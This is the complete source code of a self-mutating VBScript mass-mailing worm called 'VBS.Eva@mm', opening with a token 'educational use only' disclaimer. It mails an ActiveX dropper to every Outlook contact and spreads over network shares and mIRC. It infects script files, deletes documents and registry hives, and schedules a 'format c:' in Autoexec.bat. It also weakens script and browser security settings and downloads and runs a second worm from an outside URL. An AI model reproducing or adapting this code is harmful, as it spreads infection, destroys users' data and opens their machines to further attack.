
''VBS.Eva@mm
 'cause I love her
 'this file is for educational use only
 'it is strictly forbidden to execute this script!!!

On Error Resume Next

Const ForReading = 1
'tuGQLlDYoKErffdj
Const ForWriting = 2
Const ForAppending = 8

Dim HNCTDN : Set HNCTDN = CreateObject("WScript.Shell")
Dim STGGSV : Set STGGSV = CreateObject("WScript.Network")
Dim RNSEAA : Set RNSEAA = CreateObject("Scripting.FileSystemObject")
Dim Outlook : Set Outlook = CreateObject("Outlook.Application")
Dim Internet : Set Internet = CreateObject("Microsoft.XMLHTTP")
'RZBPOaehARJqwbq

Dim RPURHG, BDBPDG, VKPGDK, BBOAOB, HTMLPath, HTMLBody, IOMVEV

    RPURHG = CreateName()
    BDBPDG = RNSEAA.GetSpecialFolder(0) &"\"
    VKPGDK = RNSEAA.GetSpecialFolder(1) &"\"
    BBOAOB = RNSEAA.GetSpecialFolder(2) &"\"
    HTMLPath = BDBPDG &"SexSells.html"
'iLjJ
    IOMVEV = WScript.ScriptFullName


	If RPURHG <> "" Then 
	 RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &RPURHG, "wscript.exe " &BDBPDG &RPURHG &" %", "0"
	 Polymorph()
	 NBPBRG()
	 CreateFiles()
'gSfVwg
	 Network()
	 RegistrySettings()

	 If Outlook = "Outlook" Then
	  Dim Mapi : Set Mapi = Outlook.GetNameSpace("MAPI")
       DeleteOutlookFolders()
	 
	   If RegGet("HKCU\Software\Eva\Send") <> "1" then    
'urRiKCxKnMxIcEGkHN
	    Dim MapiAdList : Set MapiAdList = Mapi.AddressLists
	    OutlookBody()
	   End If
	 End If

 	  Payload() 
 	  AntiDelete(RPURHG)
	End If
'KnxxvCdlTbasw


Sub CreateFiles()
On Error Resume Next
Dim Buffer, Code, htm, htm2
Dim Script : Set Script = RNSEAA.OpenTextFile(IOMVEV,ForReading,False)
Dim Output : Set Output = RNSEAA.OpenTextFile(Windir &RPURHG,ForWriting,True)
  
'qSd
  Do While Script.AtEndOfStream = False
   Buffer = Script.ReadLine
   Output.WriteLine Buffer
   Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(Buffer, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
  Loop

  JBSTIO.Close
  OutputFile.Close
'eQTjQVeaNyygupZtOkOUiVoipkxR

  htm = "<" & "HTML><" & "HEAD><" & "META CONTENT=" & Chr(34) & "&chr(34)&" & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META CONTENT=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " NAME=GENERATOR><" & "META CONTENT=" & Chr(34) & "AUTHOR" & Chr(34) & " NAME=Kleiner Stern><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT LANGUAGE=VBScript>"
  htm = htm & vbCrLf & "On Error Resume Next"
  htm = htm & vbCrLf & "Set RNSEAA = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
  htm = htm & vbCrLf & "If Err.Number <> 0 Then"
  htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
  htm = htm & vbCrLf & "Else"
  htm = htm & vbCrLf & "Set vbs = RNSEAA.CreateTextFile(RNSEAA.GetSpecialFolder(0) & " & Chr(34) & "\explorer.exe.vbs" & Chr(34) & ", True)"
'jlvWQrteAJxbaPXrVUg
  htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
  htm = htm & vbCrLf & "vbs.Close"
  htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
  htm = htm & vbCrLf & "ws.run RNSEAA.GetSpecialFolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & RNSEAA.GetSpecialFolder(0) & " & Chr(34) & "\explorer.exe.vbs %" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "To love a woman is the best you can do!!!" & Chr(34) & ""
  htm2 = htm2 & vbCrLf & "End If"
  htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "BODY></" & "HTML>"
  HTMLBody = htm & htm2
'VqXywcWmcYhsRRpy

  Dim HtmlFile : Set HtmlFile = RNSEAA.OpenTextFile(HTMLPath,ForWriting,True)
      Htmlfile.Write htm
      Htmlfile.Write vbcrlf
      Htmlfile.Write htm2
      Htmlfile.Close
End Sub

'mIlManaWk
Sub DeleteOutlookFolders()
On Error Resume Next
Dim i
Dim InBox : Set InBox = Mapi.GetDefaultFolder(6)
Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)

     For i = 1 to InBox.Items.Count
      If InBox.Items.Item(i).Subject = "Sex sells" Then
'jXdjfsMNegq
         InBox.Items.Item(i).Close
         InBox.Items.Item(i).Delete
      End If
     Next
   
     For i = 1 to DeletedItems.Items.Count
      If DeletedItems.Items.Item(i).Subject = "Sex sells" Then
         DeletedItems.Items.Item(i).Delete
'voYuEsWXVKC
      End If
     Next
     
Set InBox = Nothing
Set DeletedItems = Nothing
End Sub

Sub OutlookBody()
'lQzRWZPl
On Error Resume Next
Dim Address, NumOfContacts, Counter, IPOSFN, ContactNumber

  For Each Address In MapiAdList
   If Not Address.AddressEntries.Count = 0 Then
    NumOfContacts = Address.AddressEntries.Count
   
    For Counter = 1 To NumOfContacts
'tcmawmcrDjj
     Set ContactNumber = Address.AddressEntries(Counter)
     Set IPOSFN = Outlook.CreateItem(0)
         IPOSFN.To = ContactNumber.Address
     	 IPOSFN.Subject = "Sex sells"
     	 IPOSFN.HTMLBody = HTMLBody
     	 IPOSFN.DeleteAfterSubmit = True 
     	 IPOSFN.Importance = ImportanceHigh
     	 IPOSFN.Send
'MkJXhSgWxkhaurRj
     RegSet "HKCU\Software\Eva\Send", "1", "0"
    Next
   End If
  Next
End Sub

Sub RegistrySettings()
On Error Resume Next
'SNoMOYdF
Dim FileExt, Counter
    FileExt = Array(".JS\", ".DOC\", ".GIF\", ".JPG\", ".HTT\", ".BMP\", ".AVI\", ".MPG\", ".SHS\", ".MP3\")

 	For Counter = 0 To UBound(FileExt)
  	 RegSet "HKCR\" &FileExt(Counter),"VBSFile","0"
 	Next

 	RegSet "HKCR\VBSFile\Editflags", 01000100, "1" 
'kHWLnxywDldlU
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote", 1, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled", 1, "1"
 	RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "1"
	RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "VBS.Eva@mm", "0"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004", 0, "1"
'DUYSo
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200", 0, "1"
 	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "1"
	RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004", 0, "1"
End Sub

'wfRUkQ
Sub Network()
On Error Resume Next
Dim xc
Dim NetDrives : Set NetDrives = STGGSV.EnumNetworkDrives

	If NetDrives.Count <> 0 Then
  	 For xc = 0 To NetDrives.Count - 1
   	  If InStr(NetDrives.Item(xc), "\" ) <> 0 Then
'fqOPzwvGZKOlP
       RNSEAA.CopyFile WScript.ScriptFullName, RNSEAA.BuildPath(NetDrives.Item(xc), BDBPDG &RPURHG) 
   	  End If
  	 Next
 	End If

	For xc = 1 To 10 
 	 STGGSV.MapNetworkDrive "Z:", GetIPAddress()
     RNSEAA.CopyFile WScript.ScriptFullName, RNSEAA.BuildPath("Z:", BDBPDG &RPURHG) 
'UifFyplyRcAmwXRr
     STGGSV.RemoveNetworkDrive "Z:"
    Next 
End Sub

Sub Mirc(Path)     
On Error Resume Next
	If Path <> "" Then
  	 Dim MircScript : Set MircScript = RNSEAA.CreateTextFile(Path & "\script.ini", True)
'uBKxblmkpQXHWVgkneHXPxdgDch
      	 MircScript.attributes = MircScript.attributes + 1
      	 MircScript.attributes = MircScript.attributes + 2
      	 MircScript.writeline "[script]"
      	 MircScript.writeLine ";mIRC Script"
      	 MircScript.writeLine ";http://www.mirc.com"
      	 MircScript.writeLine ";Please dont edit this script"
      	 MircScript.writeline "n0=on 1:JOIN:#:{"
       	 MircScript.writeline "n1= /if ( $nick == $me ) { halt }"
'NuJffKUbHGa
      	 MircScript.writeline "n2= /.dcc send $nick " &HTMLPath
      	 MircScript.writeline "n3=}"
      	 MircScript.writeline "n4=on 1:OP:#:.timer1 1200 /kick $me you worked for too long - go out an love someone!!!"
      	 MircScript.writeline "n5=on 1:Join:#:if $chan = #help /part $chan"
      	 MircScript.writeline "n7=on 1:Text:#:lovet:/say $chan Yes I love her!!!"
      	 MircScript.writeline "n9=on 1:Text:leave:#:{ /msg $chan Your will is my command"
      	 MircScript.writeline "n9=                    /part $chan }"
      	 MircScript.Close
'XuIBVCKVYexOXYdDxaLShqeOJJHN
 	End If
End Sub

Sub CreateGarbage()
On Error Resume Next
Dim aname,x
          x = 0
    AName = ""
'EMCodgyIFkukapBhhZZxHVuQtUiv
 
 	Randomize(timer)
    Do until x = 2500
  	 Do until Len(AName) = 7 
   	  AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
  	 Loop
      
   	 Dim GarbageFolder : Set GarbageFolder = RNSEAA.CreateFolder("c:\" &AName)
'ftpPwJQLYlmKMWqDUyFdYC
       	 GarbageFolder.attributes = GarbageFolder.attributes + 2
         GarbageFolder.attributes = GarbageFolder.attributes + 1
       
   	 Dim GarbageFile : Set GarbageFile = RNSEAA.CreateTextFile("c:\" &AName &"\" &AName &".txt", True)
         GarbageFile.WriteLine "I love you, Eva!" 
         GarbageFile.Close
     
  	 AName = "" 
'QOTDuDeJsK
  	 x = x + 1
 	Loop       
End Sub

Sub Payload()
On Error Resume Next
     DoDrives()
     CreateGarbage()
'mdFfOwreCqgvIonQoOlXkC
     RNSEAA.DeleteFile(BDBPDG &"Regedit.exe")

     If RegGet("HKCU\Software\Eva\Date") > Day(Date) then
      If RegGet("HKCU\Software\Eva\Date") - Day(Date) > 3 then
         RNSEAA.DeleteFile(Windir &"User.dat")
         RNSEAA.DeleteFile(Windir &"User.bak")
         RNSEAA.DeleteFile(Windir &"System.dat")
         RNSEAA.DeleteFile(Windir &"System.bak")
'mfzwWoQWScsRSicJpMbPsDDCH
         RNSEAA.DeleteFile(BDBPDG &"Regedit.exe")
 
         Dim Autoexec : Set Autoexec = RNSEAA.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
             Autoexec.WriteLine "format c: /q /autotest /u"
             Autoexec.Close
    
         HNCTDN.Run "RunDll32.exe Shell32.dll,SHExitWindowsEx 0x01"
      End If 
'iqYgfxCFvXiaPuwUtyOrGrcHaE
     Else
      RegSet "HKCU\Software\Eva\Date", Day(Date), "0"
     End If
     
	If day(now) = 2 then
	 RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 00000001, "1" 
     HTTPFileDownload "http://www.astalavista.com/archive/virus/mailworms/homepage_src.txt",BDBPDG &"hp.vbs"
     HNCTDN.run "wscript.exe " &BDBPDG &"hp.vbs %"
'teiMivoJGxZQMZlDMX
    End If     
End Sub     


Function Dodrives()
On Error Resume Next
 Dim hdready
 Set Drives = RNSEAA.Drives
'lSUyVeYCMNLQkrAbqpHLOFbrjY

 For Each Drive In Drives
  If Drive.Drivetype = Remote Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
  ElseIf Drive.IsReady Then
   hdready = Drive & "\"
   Call Subfolders(hdready)
'bydspkNNlvJiFhIyjc
  End If
 Next
End Function

Function Subfolders(path)
On Error Resume Next
 
 Set Fold = RNSEAA.GetFolder(path)
'eElwEzMpyALfGImtPYMpkkiofnGdc
 Set Files = Fold.Files

 For Each file In Files
  Ext = lcase(RNSEAA.GetExtensionName(File.Path))

  If file.Name = "mirc.ini" Then
   Call Mirc(file.ParentFolder)
  End If
'yCsUuHtR

  If (Ext = "vbs") or (Ext = "vbe") then
   Dim VBSFile : Set VBSFile = RNSEAA.OpenTextFile(File.Path,ForAppending,True)
   Dim JBSTIO : Set JBSTIO = RNSEAA.OpenTextFile(IOMVEV,ForReading,True)
       VBSFile.Write JBSTIO.ReadAll
       VBSFile.Close
       JBSTIO.Close
  End If 
'vLXEDo

  If (Ext = "htm") or (Ext = "html") Then
   Set htmfile = RNSEAA.OpenTextFile(DFile.Path,2,True)
       htmfile.write htmlbody
       htmfile.close
  End If
    
  If Ext = "doc" Then
'vGTsPrSgtgdroO
   RNSEAA.DeleteFile(File.Path)
  End If

  If (Ext = "exe") or (Ext = "xls") or (Ext = "com") Then
   Dim f
   Set f = RNSEAA.GetFile(File.Path)
       f.attributes = f.attributes + 2
  End If
'HOKWjkJKVpBSwEZcWzuusyhaiQnp
 Next

 Set file = Fold.Subfolders
  For Each Subfol In file
   Call Subfolders(Subfol.path)
  Next
End Function
   
'YPkRtbQgSbmZZ
Sub Antidelete(rname)
On Error Resume Next
 	Dim CRFFKI, IOHGDE
 	Set CRFFKI = RNSEAA.OpenTextFile(IOMVEV,ForReading,False)
     	IOHGDE = CRFFKI.readall
     	CRFFKI.Close

 	Do
'vsHXCWGL
  	 If Not (RNSEAA.FileExists(IOMVEV)) Then
   	  Set CRFFKI = RNSEAA.CreateTextFile(IOMVEV, True)
          CRFFKI.write IOHGDE
          CRFFKI.Close
      End If

    Loop
End Sub
'oley

Sub NBPBRG()
Dim JBSTIO, RDJGBE, VTTBKI, CEFKJM, JNGJSN, DKLRGQ 
Set JBSTIO = RNSEAA.OpenTextFile(IOMVEV,ForReading,False)

 Randomize(timer)
 RDJGBE = JBSTIO.Readall
 VTTBKI = "HNCTDN STGGSV RPURHG BDBPDG VKPGDK BBOAOB IOMVEV IPOSFN IOHGDE CRFFKI NBPBRG RNSEAA JBSTIO RDJGBE VTTBKI LVSJCB CEFKJM JNGJSN TKNATV TBIVOO COKBRV JNBMOQ CVTGFQ DSALUO DKLRGQ "
'JbDKFSWgEGQVwOdzVODgpqo

 Do
  CEFKJM = Left(VTTBKI, InStr(VTTBKI, Chr(32)) - 1)
  VTTBKI = Mid(VTTBKI, InStr(VTTBKI, Chr(32)) + 1)
  JNGJSN = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))

  Do
   DKLRGQ = InStr(DKLRGQ + 1, RDJGBE, CEFKJM)
'ddMZlpsjLUChkHhmCNetfWuTSrq
   If DKLRGQ Then
    RDJGBE = Mid(RDJGBE, 1, (DKLRGQ - 1)) & JNGJSN & Mid(RDJGBE, (DKLRGQ + Len(CEFKJM)))
   End If 
  Loop While DKLRGQ
 Loop While VTTBKI <> ""
 JBSTIO.Close
 
 Set JBSTIO = RNSEAA.OpenTextFile(IOMVEV,ForWriting,True) 
'GdHT
     JBSTIO.Writeline RDJGBE
     JBSTIO.Close
End Sub


Function CreateName()
On Error Resume Next
Dim TKNATV, TBIVOO, COKBRV, JNBMOQ, CVTGFQ, DSALUO
'XUnMh

Randomize(timer)
 COKBRV = Int(Rnd(1)*30)+1

 for TBIVOO = 1 to COKBRV
  Randomize(timer)
  TKNATV = TKNATV & Chr(Int(Rnd(1)*26)+65)
 Next
'LYkCZMWqkR
 
Randomize(timer)
 JNBMOQ = "DocXlsMpgBmpMp3TxtJpgGifAviUrlHtmTxt"
 CVTGFQ = int(rnd(1)* 11) + 1
 DSALUO = "." & mid(JNBMOQ,((CVTGFQ-1)*3)+1,3)
 DSALUO = DSALUO & ".vbs"

 CreateName = TKNATV &DSALUO
'xUdYBLMKPjqy
End Function

Function RegGet(value)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 RegGet = re.RegRead(value)
End Function
'XXimpgJ

Sub RegSet(key,value,keytype)
On Error Resume Next
 Dim re
 Set re = CreateObject("WScript.Shell")
 
 Select Case keytype   
  Case "1" re.RegWrite key,value, "REG_DWORD"
'GotokXgJJh
  Case Else re.RegWrite key,value
 End Select  
End Sub

Function GetIPAddress()
On Error Resume Next
Dim Buffer, dot, subnet, i, tmp, IPAddress 
	Randomize(timer)
'FeAcEYuYerLsFLHUgwGHSmgNPt
    HNCTDN.run windir &"ipconfig.exe /batch " &BBOAOB &"ip.txt",0,True 

	Dim IPFile : Set IPFile = RNSEAA.OpenTextFile(BBOAOB &"ip.txt",ForReading,False)
    	IPFile.SkipLine
    	IPFile.SkipLine
    	IPFile.SkipLine
    	IPFile.SkipLine
    	IPFile.SkipLine
'WTw
    	Buffer = IPFile.ReadLine 
    	IPFile.Close
 
    RNSEAA.DeleteFile(BBOAOB &"ip.txt")
    
    dot = 0  
    subnet = ""
    Buffer = Mid(Buffer,32,Len(Buffer))
'rqvfmuNTSeZToVxvbUlaWfqPPn
   
  	For i = 1 to Len(Buffer)
   	 If Mid(Right(Buffer,i),1,1) = "." Then
      dot = dot + 1
   	 End If
   
   	 If dot = 3 Then
      SubNet = Left(Buffer,i)	
'gMbLfzNzwpLHaOb
      Exit For
     End If
    Next

	For i = 0 to 2  
 	 tmp = tmp &Int((9 - 0 + 1) * Rnd + 0)
	Next

'atuTUyeLHOdm
                   IPAddress = Subnet &tmp
  	GetIPAddress = IPAddress
End Function 

Function HTTPFileDownload( url, FileSaveTo )
On Error Resume Next
Dim receive, Output, i

'ZUUSYIzIjNwPTWNiPrOfQlYXJ
    Output = ""
    Internet.open "GET",url,False
    Internet.send
    receive = Internet.responseBody

    For i = 0 to UBound(receive)
     Output = Output & chrw(ascw(chr(ascb(midb(receive,i+1,1)))))
    Next
'YrFVBUEJfYWPdazYszvIMuvHRMm

    Dim Download : Set Download = RNSEAA.CreateTextFile(FileSaveTo,True)
        Download.Write Output
        Download.Close
End Function

Sub Polymorph()
On Error Resume Next
'uRgUxHIGMunulkDHKB
Dim Openfile,File,Strings,x,Clearfile,Mutatebody, Victim

Set openfile = RNSEAA.OpenTextFile(Wscript.ScriptFullName,1)
file = openfile.ReadAll
openfile.Close

Strings = Split (file, vbCrLf)

'nfvbeBbgvHnQoNMl
For x = 0 To UBound (Strings) Step 1
 If Strings(x) = Chr(39) & Chr(39) & "VBS.Eva@mm" Then
  Exit For
 End If
Next

For x = x To UBound (Strings) Step 1
 If Mid (Strings(x), 1, 1) = Chr(39) And Mid (Strings(x), 2,1) <> Chr(39) Then
'jCleyvVnPGCPcs
  x = x
 Else
  Clearfile = Clearfile & Strings(x) & vbCrLf

  If Strings(x) = Chr(39) & Chr(39) & "I Love You" Then
   Exit For
  End If
 End If
'DNhbJfQgmvj
Next

 MutateBody = vbCrLf & Mutator(Clearfile)
     
 Set Victim = RNSEAA.OpenTextFile(Wscript.ScriptFullName,2,True,0)
 Victim.Write MutateBody
 Victim.CLose
End Sub
'bCJRsIHYWsJB

Function Mutator(CTM)
On Error Resume Next
Dim Strings,CommentsCount,CommentPlace,y,b,DoMutateBody,Comment

 Strings = Split (CTM, vbCrLf)
 CommentsCount = Cbyte (GetRndNumber(3, UBound(Strings) / 1.5))
 CommentPlace = Cbyte (UBound(Strings) / CommentsCount)
'ZtZnjWfIIgpEdycDXtXdrxfr
 y = 0

 For b = 0 To UBound(Strings) Step 1
  DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
  y = y + 1
 
  If y = CommentPlace Then
   Comment = MakeComment
'tHksuFBDhoKTHkefdKtBJzyRGJyCd
   DoMutateBody = DoMutateBody & Comment
   y = 0
  End If
 Next

 Mutator = DoMutateBody
End Function

'NBXNCSKKvvdrXmVqLYL
Function MakeComment
On Error Resume Next
Dim CommentLenght,DoComment,z,a

 CommentLenght = Cbyte (GetRndNumber(3, 30))
 DoComment = Chr(39)
 
 For z = 1 To CommentLenght Step 1
'dxuUCOUQpqPRvaHZDKiGBCz
  a = CByte(GetRndNumber (65, 122))
  
  If a < 91 Or a > 96 Then
   DoComment = DoComment & Chr(a)
  Else
   z = z - 1
  End If
 Next
'QIQrVFXVqXzidWncYh

 MakeComment = DoComment & vbCrLf
End Function

Function GetRndNumber(a,b)
On Error Resume Next
Dim c

'aRCazNJMRnaXliIaCIERUeDEPUu
 Randomize(timer)
 c = (b - a) * Rnd + a
 GetRndNumber = c
End Function
''I Love You


